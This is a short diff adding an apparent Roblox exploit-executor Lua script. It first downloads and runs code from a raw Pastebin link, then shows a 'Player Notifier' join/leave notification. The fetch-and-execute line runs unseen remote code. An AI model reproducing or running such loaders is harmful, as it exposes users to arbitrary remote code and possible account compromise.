@@ -1,0 +1,7 @@
+loadstring(game:HttpGet("https://pastebin.com/raw/c5JacC0M"))()
+    -- notifikation joiend/left
+game.StarterGui:SetCore("SendNotification", {
+    Title = "Player Notifier✅On";
+    Text = "u will be notified wen players leave/join";
+ 
+})
